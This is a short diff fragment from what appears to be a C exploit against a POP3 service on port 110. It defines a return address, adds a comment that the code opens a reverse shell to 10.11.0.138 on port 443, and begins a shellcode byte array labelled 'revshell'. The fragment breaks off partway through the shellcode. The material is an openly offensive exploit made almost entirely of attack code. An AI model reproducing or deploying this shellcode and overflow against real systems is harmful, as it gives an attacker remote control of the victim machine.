@@ -12,6 +12,8 @@
 #define retadd "\x8f\x35\x4a\x5f"
 #define port 110
 
+//creates a reverse shell to 10.11.0.138 on port 443
+
 /* revshell  */
 char shellcode[] =
 "\xb8\x39\x24\x28\x1d\xdd\xc2\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
